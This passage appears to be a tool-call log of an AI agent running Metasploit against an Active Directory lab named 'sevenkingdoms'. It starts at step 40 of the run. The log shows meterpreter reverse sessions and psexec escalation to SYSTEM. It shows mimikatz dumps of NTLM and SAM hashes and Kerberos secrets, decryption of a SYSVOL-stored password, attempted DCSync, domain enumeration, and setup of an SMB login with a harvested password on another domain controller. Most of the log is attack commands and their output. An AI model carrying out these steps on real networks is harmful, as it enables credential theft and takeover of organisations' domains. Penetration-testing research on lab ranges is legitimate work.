### 40. [2025-12-17 12:00:15] `msf_session_interact` ✅

```
type \\winterfell.north.sevenkingdoms.local\NETLOGON\script.ps1
# fake script in netlogon with creds
$task = '/c TODO'
$taskName = "fake task"
$user = "NORTH\jeor.mormont"
$password = "_L0ngCl@w_"

# passwords in sysvol still ...
C:\Users\jon.snow\Desktop>
```

### 41. [2025-12-17 12:00:39] `msf_module_execute` ✅

```
Module launched as job 3. Use msf_job_info to check status.
```

### 42. [2025-12-17 12:00:45] `msf_sessions_list` ✅

```
[
  {
    "id": "1",
    "type": "meterpreter",
    "info": "NORTH\\jon.snow @ CASTELBLACK",
    "tunnel": "10.50.0.1:4444 -> 10.50.0.22:52916",
    "via": "exploit/multi/handler",
    "target": ""
  },
  {
    "id": "2",
    "type": "meterpreter",
    "info": "",
    "tunnel": "10.50.0.1:4445 -> 10.50.0.22:52944",
    "via": "exploit/windows/smb/psexec",
    "target": "10.50.0.22"
  }
]
```

### 43. [2025-12-17 12:00:52] `msf_session_interact` ✅

```
Server username: NT AUTHORITY\SYSTEM
```

### 44. [2025-12-17 12:00:53] `msf_session_interact` ✅

```
Enabled Process Privileges
==========================

Name
----
SeAssignPrimaryTokenPrivilege
SeAuditPrivilege
SeBackupPrivilege
SeChangeNotifyPrivilege
SeCreateGlobalPrivilege
SeCreatePagefilePrivilege
SeCreatePermanentPrivilege
SeCreateSymbolicLinkPrivilege
SeDebugPrivilege
SeDelegateSessionUserImpersonatePrivilege
SeImpersonatePrivilege
SeIncreaseBasePriorityPrivilege
SeIncreaseQuotaPrivilege
SeIncreaseWorkingSetPrivilege
SeLoadDriverPrivilege
SeLockMemoryPrivilege
SeManageVolumePrivilege
SeProfileSingleProcessPrivilege
SeRestorePrivilege
SeSecurityPrivilege
SeShutdownPrivilege
SeSystemEnvironmentPrivilege
SeSystemProfilePrivilege
SeSystemtimePrivilege
SeTakeOwnershipPrivilege
SeTcbPrivilege
SeTimeZonePrivilege
SeUndockPrivilege
```

### 45. [2025-12-17 12:01:01] `msf_session_interact` ✅

```
Loading extension kiwi...
```

### 46. [2025-12-17 12:01:06] `msf_session_interact` ✅

```
.#####.   mimikatz 2.2.0 20191125 (x64/windows)
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > http://blog.gentilkiwi.com/mimikatz
 '## v ##'        Vincent LE TOUX            ( vincent.letoux@gmail.com )
  '#####'         > http://pingcastle.com / http://mysmartlogon.com  ***/

Success.
[+] Running as SYSTEM
[*] Retrieving all credentials
msv credentials
===============

Username      Domain  NTLM                              SHA1                                      DPAPI
--------      ------  ----                              ----                                      -----
CASTELBLACK$  NORTH   7d3771df8a6124a6701960155a3495b8  e5c13e6159788ed30364a29fcd697beb4ed6f15c
jon.snow      NORTH   b8d76e56e9dac90539aff05e3ccb1755  1315aeb7efe3eed73b568094db32a90f2e24a248  d17b93d9e6b7cbf7c2a6763ab9500965
robb.stark    NORTH   831486ac7f26860c9e2f51ac91e1a07a  3bea28f1c440eed7be7d423cefebb50322ed7b6c  8f2cb3c0875b5e54e211a7668f965cf0
sql_svc       NORTH   84a5092f53390ea48d660be52b93b804  9fd961155e28b1c6f9b3859f32f4779ad6a06404  edde3ff06a21fac533c5cc3c61eee1f7

wdigest credentials
===================

Username      Domain  Password
--------      ------  --------
(null)        (null)  (null)
CASTELBLACK$  NORTH   (null)
jon.snow      NORTH   (null)
robb.stark    NORTH   (null)
sql_svc       NORTH   (null)

kerberos credentials
====================

Username      Domain                     Password
--------      ------                     --------
(null)        (null)                     (null)
CASTELBLACK$  north.sevenkingdoms.local  Z1\kY9H8\u(OzV#wEwbKYE]Kav)3yFo Izfgg@-Nt!n@E@e'c8(r=b>!3GY*sNrGX&sc<P.S)):Hg#S)LCqO:75e/
                                         u)Xx`i_!44-LqNe2`MH6o@xyzz.G)ud
castelblack$  NORTH.SEVENKINGDOMS.LOCAL  (null)
jon.snow      NORTH.SEVENKINGDOMS.LOCAL  (null)
robb.stark    NORTH.SEVENKINGDOMS.LOCAL  (null)
sql_svc       NORTH.SEVENKINGDOMS.LOCAL  YouWi
... [truncated]
```

### 47. [2025-12-17 12:01:27] `msf_session_interact` ✅

```
Administrator:500:aad3b435b51404eeaad3b435b51404ee:dbd13e1c4e338284ac4e9874f7de6ef4:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
vagrant:1000:aad3b435b51404eeaad3b435b51404ee:e02bc503339d51f71d913c245d35b50b:::
WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:4363b6dc0c95588964884d7e1dfea1f7:::
```

### 48. [2025-12-17 12:01:27] `msf_session_interact` ✅

```
Process 7700 created.
Channel 1 created.
Microsoft Windows [Version 10.0.17763.1935]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>
```

### 49. [2025-12-17 12:01:36] `msf_session_interact` ✅

```
net user robb.stark /domain
The request will be processed at a domain controller for domain north.sevenkingdoms.local.

User name                    robb.stark
Full Name                    
Comment                      Robb Stark
User's comment               
Country/region code          000 (System Default)
Account active               Yes
Account expires              Never

Password last set            12/12/2025 1:00:34 AM
Password expires             Never
Password changeable          12/13/2025 1:00:34 AM
Password required            Yes
User may change password     Yes

Workstations allowed         All
Logon script                 
User profile                 
Home directory               
Last logon                   12/17/2025 4:00:41 AM

Logon hours allowed          All

Local Group Memberships      *Administrators       
Global Group memberships     *Domain Users         *Stark                
The command completed successfully.


C:\Windows\system32>
```

### 50. [2025-12-17 12:01:42] `msf_session_interact` ✅

```
net user sql_svc /domain
The request will be processed at a domain controller for domain north.sevenkingdoms.local.

User name                    sql_svc
Full Name                    
Comment                      sql service
User's comment               
Country/region code          000 (System Default)
Account active               Yes
Account expires              Never

Password last set            12/12/2025 1:00:56 AM
Password expires             Never
Password changeable          12/13/2025 1:00:56 AM
Password required            Yes
User may change password     Yes

Workstations allowed         All
Logon script                 
User profile                 
Home directory               
Last logon                   12/12/2025 1:32:20 AM

Logon hours allowed          All

Local Group Memberships      
Global Group memberships     *Domain Users         
The command completed successfully.


C:\Windows\system32>
```

### 51. [2025-12-17 12:01:54] `msf_session_interact` ✅

```
net group "Domain Computers" /domain
The request will be processed at a domain controller for domain north.sevenkingdoms.local.

Group name     Domain Computers
Comment        All workstations and servers joined to the domain

Members

-------------------------------------------------------------------------------
CASTELBLACK$             
The command completed successfully.


C:\Windows\system32>
```


## Phase 4: SYSTEM Access & Enumeration

### 52. [2025-12-17 12:02:06] `msf_session_interact` ✅

```
dir \\winterfell.north.sevenkingdoms.local\C$
Access is denied.

C:\Windows\system32>
```

### 53. [2025-12-17 12:02:15] `msf_session_interact` ❌

```
Error: MSF Error: true
```

### 54. [2025-12-17 12:02:19] `msf_session_interact` ❌

```
Error: MSF Error: true
```

### 55. [2025-12-17 12:02:24] `msf_sessions_list` ✅

```
[
  {
    "id": "1",
    "type": "meterpreter",
    "info": "NORTH\\jon.snow @ CASTELBLACK",
    "tunnel": "10.50.0.1:4444 -> 10.50.0.22:52916",
    "via": "exploit/multi/handler",
    "target": ""
  }
]
```

### 56. [2025-12-17 12:02:36] `msf_module_execute` ✅

```
Module launched as job 4. Use msf_job_info to check status.
```

### 57. [2025-12-17 12:02:41] `msf_sessions_list` ✅

```
[
  {
    "id": "1",
    "type": "meterpreter",
    "info": "NORTH\\jon.snow @ CASTELBLACK",
    "tunnel": "10.50.0.1:4444 -> 10.50.0.22:52916",
    "via": "exploit/multi/handler",
    "target": ""
  },
  {
    "id": "3",
    "type": "meterpreter",
    "info": "NT AUTHORITY\\SYSTEM @ CASTELBLACK",
    "tunnel": "10.50.0.1:4446 -> 10.50.0.22:52949",
    "via": "exploit/windows/smb/psexec",
    "target": "10.50.0.22"
  }
]
```

### 58. [2025-12-17 12:02:48] `msf_module_execute` ✅

```
Module launched as job 5. Use msf_job_info to check status.
```

### 59. [2025-12-17 12:02:54] `msf_sessions_list` ✅

```
[
  {
    "id": "1",
    "type": "meterpreter",
    "info": "NORTH\\jon.snow @ CASTELBLACK",
    "tunnel": "10.50.0.1:4444 -> 10.50.0.22:52916",
    "via": "exploit/multi/handler",
    "target": ""
  },
  {
    "id": "3",
    "type": "meterpreter",
    "info": "NT AUTHORITY\\SYSTEM @ CASTELBLACK",
    "tunnel": "10.50.0.1:4446 -> 10.50.0.22:52949",
    "via": "exploit/windows/smb/psexec",
    "target": "10.50.0.22"
  }
]
```

### 60. [2025-12-17 12:03:00] `msf_session_interact` ✅

```
Process 4884 created.
Channel 1 created.
Microsoft Windows [Version 10.0.17763.1935]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>
```

### 61. [2025-12-17 12:03:06] `msf_session_interact` ✅

```
nltest /dclist:north.sevenkingdoms.local
Get list of DCs in domain 'north.sevenkingdoms.local' from '\\winterfell.north.sevenkingdoms.local'.
    winterfell.north.sevenkingdoms.local [PDC]  [DS] Site: Default-First-Site-Name
The command completed successfully

C:\Windows\system32>
```

### 62. [2025-12-17 12:03:13] `msf_session_interact` ✅

```
nltest /dclist:sevenkingdoms.local
Get list of DCs in domain 'sevenkingdoms.local' from '\\kingslanding.sevenkingdoms.local'.
    kingslanding.sevenkingdoms.local [PDC]  [DS] Site: Default-First-Site-Name
The command completed successfully

C:\Windows\system32>
```

### 63. [2025-12-17 12:03:13] `msf_session_interact` ✅

```
net group "Domain Admins" /domain
The request will be processed at a domain controller for domain north.sevenkingdoms.local.

Group name     Domain Admins
Comment        Designated administrators of the domain

Members

-------------------------------------------------------------------------------
Administrator            eddard.stark             
The command completed successfully.


C:\Windows\system32>
```

### 64. [2025-12-17 12:03:21] `msf_session_interact` ✅

```
net localgroup administrators
Alias name     administrators
Comment        Administrators have complete and unrestricted access to the computer/domain

Members

-------------------------------------------------------------------------------
Administrator
NORTH\Domain Admins
NORTH\jeor.mormont
vagrant
The command completed successfully.


C:\Windows\system32>
```

### 65. [2025-12-17 12:03:41] `msf_session_interact` ✅

```
powershell -ep bypass -c "$keyData = 177, 252, 228, 64, 28, 91, 12, 201, 20, 91, 21, 139, 255, 65, 9, 247, 41, 55, 164, 28, 75, 132, 143, 71, 62, 191, 211, 61, 154, 61, 216, 91; $secret='76492d1116743f0423413b16050a5345MgB8AGkAcwBDACsAUwArADIAcABRAEcARABnAGYAMwA3AEEAcgBFAEIAYQB2AEEAPQA9AHwAZQAwADgANAA2ADQAMABiADYANAAwADYANgA1ADcANgAxAGIAMQBhAGQANQBlAGYAYQBiADQAYQA2ADkAZgBlAGQAMQAzADAANQAyADUAMgAyADYANAA3ADAAZABiAGEAOAA0AGUAOQBkAGMAZABmAGEANAAyADkAZgAyADIAMwA='; $ss = ConvertTo-SecureString $secret -Key $keyData; $cred = New-Object System.Management.Automation.PSCredential('user',$ss); $cred.GetNetworkCredential().Password"
```

### 66. [2025-12-17 12:03:50] `msf_session_interact` ✅

```
powerkingftw135

C:\Windows\system32>dir /s /b \\winterfell\SYSVOL\*.xml \\winterfell\SYSVOL\*.ps1 \\winterfell\SYSVOL\*.bat 2>nul
\\winterfell\SYSVOL\north.sevenkingdoms.local\scripts\script.ps1
\\winterfell\SYSVOL\north.sevenkingdoms.local\scripts\secret.ps1

C:\Windows\system32>
```

### 67. [2025-12-17 12:04:02] `msf_session_interact` ✅

```
net user /domain | findstr -i "tyrion tywin"

C:\Windows\system32>
```

### 68. [2025-12-17 12:04:09] `msf_session_interact` ✅

```
net user eddard.stark /domain
The request will be processed at a domain controller for domain north.sevenkingdoms.local.

User name                    eddard.stark
Full Name                    
Comment                      Eddard Stark
User's comment               
Country/region code          000 (System Default)
Account active               Yes
Account expires              Never

Password last set            12/12/2025 1:00:29 AM
Password expires             Never
Password changeable          12/13/2025 1:00:29 AM
Password required            Yes
User may change password     Yes

Workstations allowed         All
Logon script                 
User profile                 
Home directory               
Last logon                   12/17/2025 4:01:34 AM

Logon hours allowed          All

Local Group Memberships      *Administrators       
Global Group memberships     *Domain Users         *Stark                
                             *Domain Admins        
The command completed successfully.


C:\Windows\system32>
```

### 69. [2025-12-17 12:04:18] `msf_module_execute` ✅

```
Module launched as job 6. Use msf_job_info to check status.
```

### 70. [2025-12-17 12:04:23] `msf_sessions_list` ✅

```
[
  {
    "id": "1",
    "type": "meterpreter",
    "info": "NORTH\\jon.snow @ CASTELBLACK",
    "tunnel": "10.50.0.1:4444 -> 10.50.0.22:52916",
    "via": "exploit/multi/handler",
    "target": ""
  },
  {
    "id": "3",
    "type": "meterpreter",
    "info": "NT AUTHORITY\\SYSTEM @ CASTELBLACK",
    "tunnel": "10.50.0.1:4446 -> 10.50.0.22:52949",
    "via": "exploit/windows/smb/psexec",
    "target": "10.50.0.22"
  }
]
```

### 71. [2025-12-17 12:04:31] `msf_session_interact` ❌

```
net user /domain
The request will be processed at a domain controller for domain north.sevenkingdoms.local.


User accounts for \\winterfell.north.sevenkingdoms.local

-------------------------------------------------------------------------------
Administrator            arya.stark               brandon.stark            
catelyn.stark            eddard.stark             Guest                    
hodor                    jeor.mormont             jon.snow                 
krbtgt                   rickon.stark             robb.stark               
samwell.tarly            sansa.stark              sql_svc                  
vagrant                  
The command completed with one or more errors.


C:\Windows\system32>
```

### 72. [2025-12-17 12:04:39] `msf_session_interact` ✅

```
net user /domain:sevenkingdoms.local
You used an option with an invalid value.

The syntax of this command is:

NET USER
[username [password | *] [options]] [/DOMAIN]
         username {password | *} /ADD [options] [/DOMAIN]
         username [/DELETE] [/DOMAIN]
         username [/TIMES:{times | ALL}]
         username [/ACTIVE: {YES | NO}]

More help is available by typing NET HELPMSG 3505.


C:\Windows\system32>
```

### 73. [2025-12-17 12:04:46] `msf_module_execute` ✅

```
Module launched as job null. Use msf_job_info to check status.
```

### 74. [2025-12-17 12:04:55] `msf_module_execute` ✅

```
Module launched as job 7. Use msf_job_info to check status.
```

### 75. [2025-12-17 12:05:01] `msf_sessions_list` ✅

```
[
  {
    "id": "1",
    "type": "meterpreter",
    "info": "NORTH\\jon.snow @ CASTELBLACK",
    "tunnel": "10.50.0.1:4444 -> 10.50.0.22:52916",
    "via": "exploit/multi/handler",
    "target": ""
  },
  {
    "id": "3",
    "type": "meterpreter",
    "info": "NT AUTHORITY\\SYSTEM @ CASTELBLACK",
    "tunnel": "10.50.0.1:4446 -> 10.50.0.22:52949",
    "via": "exploit/windows/smb/psexec",
    "target": "10.50.0.22"
  }
]
```

### 76. [2025-12-17 12:05:10] `msf_session_interact` ✅

```
dsquery * -filter "(description=*)" -attr samaccountname description -limit 50
'dsquery' is not recognized as an internal or external command,
operable program or batch file.

C:\Windows\system32>
```

### 77. [2025-12-17 12:05:19] `msf_session_interact` ✅

```
powershell -ep bypass -c "Get-WmiObject -Query 'SELECT * FROM Win32_UserAccount WHERE Domain=\"NORTH\"' | Select Name,Description | Format-Table -AutoSize"
```

### 78. [2025-12-17 12:05:27] `msf_session_interact` ✅

```
Name          Description                                             
----          -----------                                             
Administrator Built-in account for administering the computer/domain  
Guest         Built-in account for guest access to the computer/domain
krbtgt        Key Distribution Center Service Account                 
vagrant       Vagrant User                                            
arya.stark    Arya Stark                                              
eddard.stark  Eddard Stark                                            
catelyn.stark Catelyn Stark                                           
robb.stark    Robb Stark                                              
sansa.stark   Sansa Stark                                             
brandon.stark Brandon Stark                                           
rickon.stark  Rickon Stark                                            
hodor         Brainless Giant                                         
jon.snow      Jon Snow                                                
samwell.tarly Samwell Tarly (Password : Heartsbane)                   
jeor.mormont  Jeor Mormont                                            
sql_svc       sql service                                             



C:\Windows\system32>findstr /si cpassword \\winterfell\SYSVOL\north.sevenkingdoms.local\Policies\*.xml

C:\Windows\system32>
```

### 79. [2025-12-17 12:05:38] `msf_session_interact` ✅

```
net user samwell.tarly /domain
The request will be processed at a domain controller for domain north.sevenkingdoms.local.

User name                    samwell.tarly
Full Name                    
Comment                      Samwell Tarly (Password : Heartsbane)
User's comment               
Country/region code          000 (System Default)
Account active               Yes
Account expires              Never

Password last set            12/12/2025 1:00:50 AM
Password expires             Never
Password changeable          12/13/2025 1:00:50 AM
Password required            Yes
User may change password     Yes

Workstations allowed         All
Logon script                 
User profile                 
Home directory               
Last logon                   Never

Logon hours allowed          All

Local Group Memberships      
Global Group memberships     *Domain Users         *Night Watch          
The command completed successfully.


C:\Windows\system32>
```

### 80. [2025-12-17 12:05:47] `msf_session_interact` ✅

```
certutil -config - -ping
```

### 81. [2025-12-17 12:05:56] `msf_session_interact` ✅

```
(no output)
```

### 82. [2025-12-17 12:06:03] `msf_sessions_list` ✅

```
[
  {
    "id": "1",
    "type": "meterpreter",
    "info": "NORTH\\jon.snow @ CASTELBLACK",
    "tunnel": "10.50.0.1:4444 -> 10.50.0.22:52916",
    "via": "exploit/multi/handler",
    "target": ""
  },
  {
    "id": "3",
    "type": "meterpreter",
    "info": "NT AUTHORITY\\SYSTEM @ CASTELBLACK",
    "tunnel": "10.50.0.1:4446 -> 10.50.0.22:52949",
    "via": "exploit/windows/smb/psexec",
    "target": "10.50.0.22"
  }
]
```

### 83. [2025-12-17 12:06:09] `msf_module_execute` ❌

```
Error: MSF Error: true
```

### 84. [2025-12-17 12:07:25] `msf_session_interact` ✅

```
(no output)
```

### 85. [2025-12-17 12:07:30] `msf_session_interact` ✅

```
(no output)
```

### 86. [2025-12-17 12:07:36] `msf_sessions_list` ✅

```
[
  {
    "id": "1",
    "type": "meterpreter",
    "info": "NORTH\\jon.snow @ CASTELBLACK",
    "tunnel": "10.50.0.1:4444 -> 10.50.0.22:52916",
    "via": "exploit/multi/handler",
    "target": ""
  },
  {
    "id": "3",
    "type": "meterpreter",
    "info": "NT AUTHORITY\\SYSTEM @ CASTELBLACK",
    "tunnel": "10.50.0.1:4446 -> 10.50.0.22:52949",
    "via": "exploit/windows/smb/psexec",
    "target": "10.50.0.22"
  }
]
```

### 87. [2025-12-17 12:07:42] `msf_module_execute` ✅

```
Module launched as job 8. Use msf_job_info to check status.
```

### 88. [2025-12-17 12:07:49] `msf_sessions_list` ✅

```
[
  {
    "id": "1",
    "type": "meterpreter",
    "info": "NORTH\\jon.snow @ CASTELBLACK",
    "tunnel": "10.50.0.1:4444 -> 10.50.0.22:52916",
    "via": "exploit/multi/handler",
    "target": ""
  },
  {
    "id": "3",
    "type": "meterpreter",
    "info": "NT AUTHORITY\\SYSTEM @ CASTELBLACK",
    "tunnel": "10.50.0.1:4446 -> 10.50.0.22:52949",
    "via": "exploit/windows/smb/psexec",
    "target": "10.50.0.22"
  },
  {
    "id": "4",
    "type": "meterpreter",
    "info": "NT AUTHORITY\\SYSTEM @ CASTELBLACK",
    "tunnel": "10.50.0.1:4451 -> 10.50.0.22:52986",
    "via": "exploit/windows/smb/psexec",
    "target": "10.50.0.22"
  }
]
```

### 89. [2025-12-17 12:07:56] `msf_session_interact` ✅

```
Process 5784 created.
Channel 1 created.
Microsoft Windows [Version 10.0.17763.1935]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>
```


## Phase 5: Kerberos Attacks & Delegation Discovery

### 90. [2025-12-17 12:08:04] `msf_session_interact` ✅

```
powershell -ep bypass -c "Get-ADComputer CASTELBLACK -Properties TrustedForDelegation,msDS-AllowedToDelegateTo | Select Name,TrustedForDelegation,msDS-AllowedToDelegateTo"
```

### 91. [2025-12-17 12:08:15] `msf_session_interact` ❌

```
Get-ADComputer : The term 'Get-ADComputer' is not recognized as the name of a cmdlet, function, script file, or 
operable program. Check the spelling of the name, or if a path was included, verify that the path is correct and try 
again.
At line:1 char:1
+ Get-ADComputer CASTELBLACK -Properties TrustedForDelegation,msDS-Allo ...
+ ~~~~~~~~~~~~~~
    + CategoryInfo          : ObjectNotFound: (Get-ADComputer:String) [], CommandNotFoundException
    + FullyQualifiedErrorId : CommandNotFoundException
 

C:\Windows\system32>exit
```

### 92. [2025-12-17 12:08:24] `msf_session_interact` ✅

```
Loading extension kiwi...
```

### 93. [2025-12-17 12:08:30] `msf_session_interact` ✅

```
.#####.   mimikatz 2.2.0 20191125 (x64/windows)
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > http://blog.gentilkiwi.com/mimikatz
 '## v ##'        Vincent LE TOUX            ( vincent.letoux@gmail.com )
  '#####'         > http://pingcastle.com / http://mysmartlogon.com  ***/

Success.

[00000000] - 0x00000017 - rc4_hmac_nt      
   Start/End/MaxRenew: 12/17/2025 4:03:13 AM ; 12/17/2025 8:18:16 AM ; 12/19/2025 1:46:14 AM
   Server Name       : krbtgt/SEVENKINGDOMS.LOCAL @ NORTH.SEVENKINGDOMS.LOCAL
   Client Name       : castelblack$ @ NORTH.SEVENKINGDOMS.LOCAL
   Flags 40a50000    : name_canonicalize ; ok_as_delegate ; pre_authent ; renewable ; forwardable ; 

[00000001] - 0x00000012 - aes256_hmac      
   Start/End/MaxRenew: 12/16/2025 11:36:00 PM ; 12/17/2025 8:18:16 AM ; 12/19/2025 1:46:14 AM
   Server Name       : krbtgt/NORTH.SEVENKINGDOMS.LOCAL @ NORTH.SEVENKINGDOMS.LOCAL
   Client Name       : castelblack$ @ NORTH.SEVENKINGDOMS.LOCAL
   Flags 60a10000    : name_canonicalize ; pre_authent ; renewable ; forwarded ; forwardable ; 

[00000002] - 0x00000012 - aes256_hmac      
   Start/End/MaxRenew: 12/16/2025 10:18:16 PM ; 12/17/2025 8:18:16 AM ; 12/19/2025 1:46:14 AM
   Server Name       : krbtgt/NORTH.SEVENKINGDOMS.LOCAL @ NORTH.SEVENKINGDOMS.LOCAL
   Client Name       : castelblack$ @ NORTH.SEVENKINGDOMS.LOCAL
   Flags 40e10000    : name_canonicalize ; pre_authent ; initial ; renewable ; forwardable ; 

[00000003] - 0x00000012 - aes256_hmac      
   Start/End/MaxRenew: 12/17/2025 4:03:51 AM ; 12/17/2025 8:18:16 AM ; 12/19/2025 1:46:14 AM
   Server Name       : cifs/winterfell @ NORTH.SEVENKINGDOMS.LOCAL
   Client Name       : castelblack$ @ NORTH.SEVENKINGDOMS.LOCAL
   Flags 40a50000    : name_canonicalize ; ok_as_delegate ; pre_authent ; renewable ; forwardable ; 

[00000004] - 0x00000012 - aes256_hmac      
   Start/End/MaxRenew: 12/17/2025 4:03:13 AM ; 12/17/2025 8
... [truncated]
```

### 94. [2025-12-17 12:08:39] `msf_session_interact` ❌

```
ERROR mimikatz_doLocal ; "tgs" module not found !

        standard  -  Standard module  [Basic commands (does not require module name)]
          crypto  -  Crypto Module
        sekurlsa  -  SekurLSA module  [Some commands to enumerate credentials...]
        kerberos  -  Kerberos package module  []
             ngc  -  Next Generation Cryptography module (kiwi use only)  [Some commands to enumerate credentials...]
       privilege  -  Privilege module
         process  -  Process module
         service  -  Service module
         lsadump  -  LsaDump module
              ts  -  Terminal Server module
           event  -  Event module
            misc  -  Miscellaneous module
           token  -  Token manipulation module
           vault  -  Windows Vault/Credential module
     minesweeper  -  MineSweeper module
             net  -  
           dpapi  -  DPAPI Module (by API or RAW access)  [Data Protection application programming interface]
          sysenv  -  System Environment Value module
             sid  -  Security Identifiers module
             iis  -  IIS XML Config module
             rpc  -  RPC control of mimikatz
            sr98  -  RF module for SR98 device and T5577 target
             rdm  -  RF module for RDM(830 AL) device
             acr  -  ACR Module
```

### 95. [2025-12-17 12:08:45] `msf_session_interact` ❌

```
ERROR mimikatz_doLocal ; "s4u" command of "kerberos" module not found !

Module :	kerberos
Full name :	Kerberos package module
Description :	

             ptt  -  Pass-the-ticket [NT 6]
            list  -  List ticket(s)
             ask  -  Ask or get TGS tickets
             tgt  -  Retrieve current TGT
           purge  -  Purge ticket(s)
          golden  -  Willy Wonka factory
            hash  -  Hash password to keys
             ptc  -  Pass-the-ccache [NT6]
           clist  -  List tickets in MIT/Heimdall ccache
```

### 96. [2025-12-17 12:08:53] `msf_session_interact` ✅

```
Process 7608 created.
Channel 2 created.
Microsoft Windows [Version 10.0.17763.1935]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>
```

### 97. [2025-12-17 12:09:00] `msf_session_interact` ✅

```
dir \\winterfell\C$
Access is denied.

C:\Windows\system32>
```

### 98. [2025-12-17 12:09:12] `msf_session_interact` ✅

```
exit
```

### 99. [2025-12-17 12:09:18] `msf_session_interact` ❌

```
[DC] 'north.sevenkingdoms.local' will be the domain
[DC] 'winterfell.north.sevenkingdoms.local' will be the DC server
[DC] 'Administrator' will be the user account
[rpc] Service  : ldap
[rpc] AuthnSvc : GSS_NEGOTIATE (9)
ERROR kull_m_rpc_drsr_CrackName ; CrackNames (name status): 0x00000003 (3) - ERROR_NOT_UNIQUE
```

### 100. [2025-12-17 12:09:25] `msf_session_interact` ❌

```
[DC] 'north.sevenkingdoms.local' will be the domain
[DC] 'winterfell.north.sevenkingdoms.local' will be the DC server
[DC] 'NORTH\Administrator' will be the user account
[rpc] Service  : ldap
[rpc] AuthnSvc : GSS_NEGOTIATE (9)
ERROR kuhl_m_lsadump_dcsync ; GetNCChanges: 0x000020f7 (8439)
```

### 101. [2025-12-17 12:10:31] `msf_sessions_list` ✅

```
[
  {
    "id": "1",
    "type": "meterpreter",
    "info": "NORTH\\jon.snow @ CASTELBLACK",
    "tunnel": "10.50.0.1:4444 -> 10.50.0.22:52916",
    "via": "exploit/multi/handler",
    "target": ""
  },
  {
    "id": "3",
    "type": "meterpreter",
    "info": "NT AUTHORITY\\SYSTEM @ CASTELBLACK",
    "tunnel": "10.50.0.1:4446 -> 10.50.0.22:52949",
    "via": "exploit/windows/smb/psexec",
    "target": "10.50.0.22"
  },
  {
    "id": "4",
    "type": "meterpreter",
    "info": "NT AUTHORITY\\SYSTEM @ CASTELBLACK",
    "tunnel": "10.50.0.1:4451 -> 10.50.0.22:52986",
    "via": "exploit/windows/smb/psexec",
    "target": "10.50.0.22"
  }
]
```

### 102. [2025-12-17 12:10:36] `msf_module_search` ✅

```
No modules found matching query.
```

### 103. [2025-12-17 12:10:43] `msf_session_interact` ✅

```
Process 3668 created.
Channel 3 created.
Microsoft Windows [Version 10.0.17763.1935]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>
```

### 104. [2025-12-17 12:10:49] `msf_session_interact` ❌

```
sc \\\\winterfell.north.sevenkingdoms.local query spooler
[SC] OpenSCManager FAILED 1707:

The network address is invalid.


C:\Windows\system32>
```

### 105. [2025-12-17 12:10:54] `msf_session_interact` ✅

```
sc \\winterfell query spooler

SERVICE_NAME: spooler 
        TYPE               : 110  WIN32_OWN_PROCESS  (interactive)
        STATE              : 4  RUNNING 
                                (STOPPABLE, NOT_PAUSABLE, IGNORES_SHUTDOWN)
        WIN32_EXIT_CODE    : 0  (0x0)
        SERVICE_EXIT_CODE  : 0  (0x0)
        CHECKPOINT         : 0x0
        WAIT_HINT          : 0x0

C:\Windows\system32>
```

### 106. [2025-12-17 12:11:02] `msf_session_interact` ✅

```
certutil -config - -ping
```

### 107. [2025-12-17 12:11:07] `msf_session_interact` ✅

```
(no output)
```

### 108. [2025-12-17 12:11:11] `msf_session_interact` ✅

```
(no output)
```

### 109. [2025-12-17 12:11:16] `msf_session_interact` ✅

```
(no output)
```

### 110. [2025-12-17 12:11:21] `msf_session_interact` ✅

```
(no output)
```

### 111. [2025-12-17 12:11:28] `msf_console_list` ✅

```
{
  "consoles": [
    {
      "id": "1",
      "prompt": "msf exploit(multi/handler) > ",
      "busy": false
    }
  ]
}
```

### 112. [2025-12-17 12:11:45] `msf_console_execute` ✅

```
[*] Sending stage (230982 bytes) to 10.50.0.22
[*] Meterpreter session 1 opened (10.50.0.1:4444 -> 10.50.0.22:52916) at 2025-12-17 11:39:57 +0000
[*] Meterpreter session 2 opened (10.50.0.1:4445 -> 10.50.0.22:52944) at 2025-12-17 12:00:46 +0000
[*] 10.50.0.22 - Meterpreter session 2 closed.  Reason: Died
[*] Meterpreter session 3 opened (10.50.0.1:4446 -> 10.50.0.22:52949) at 2025-12-17 12:02:42 +0000
[*] Meterpreter session 4 opened (10.50.0.1:4451 -> 10.50.0.22:52986) at 2025-12-17 12:07:48 +0000
[*] Starting interaction with 3...
```

### 113. [2025-12-17 12:12:19] `msf_console_execute` ✅

```
Process 4308 created.
```

### 114. [2025-12-17 12:12:54] `msf_console_execute` ✅

```
Process 8168 created.
Channel 2 created.

SourceName                TargetName            TrustType TrustDirection
----------                ----------            --------- --------------
north.sevenkingdoms.local sevenkingdoms.local ParentChild  Bidirectional
```

### 115. [2025-12-17 12:13:32] `msf_console_execute` ✅

```
Process 4588 created.
Channel 3 created.
Administrator
Guest
vagrant
KINGSLANDING$
krbtgt
NORTH$
ESSOS$
tywin.lannister
jaime.lannister
cersei.lannister
tyron.lannister
robert.baratheon
joffrey.baratheon
renly.baratheon
stannis.baratheon
petyer.baelish
lord.varys
maester.pycelle
DRAGONSTONE$
```

### 116. [2025-12-17 12:14:10] `msf_console_execute` ✅

```
[*] Backgrounding session 3...
```

### 117. [2025-12-17 12:14:15] `msf_console_execute` ✅

```
[*] New in Metasploit 6.4 - The CreateSession option within this module can open an interactive session
```

### 118. [2025-12-17 12:14:20] `msf_console_execute` ✅

```
RHOSTS => 10.50.0.10
```

### 119. [2025-12-17 12:14:25] `msf_console_execute` ✅

```
SMBUser => tyron.lannister
```

### 120. [2025-12-17 12:14:30] `msf_console_execute` ✅

```
SMBPass => powerkingftw135
```

### 121. [2025-12-17 12:14:34] `msf_console_execute` ✅

```
SMBDomain => SEVENKINGDOMS
```

